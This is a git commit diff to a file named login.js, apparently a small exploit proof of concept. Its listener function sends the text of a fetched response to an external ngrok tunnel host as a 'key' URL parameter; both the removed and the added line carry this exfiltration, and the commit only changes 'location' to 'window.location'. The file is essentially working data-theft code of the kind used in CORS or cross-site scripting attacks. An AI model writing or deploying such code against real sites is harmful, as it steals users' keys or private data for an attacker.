cf143c95e1278852988e98aab9460c5b796a259f
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-08-31 12:48:01 +0700

    Update login.js

--- login.js
+++ login.js
@@ -6,5 +6,5 @@ xhr.setRequestHeader("Content-Type", "application/json");
 xhr.send(null);
 
 function reqListener() {
-    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
+    window.location='//2d7a-140-213-103-229.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
 };
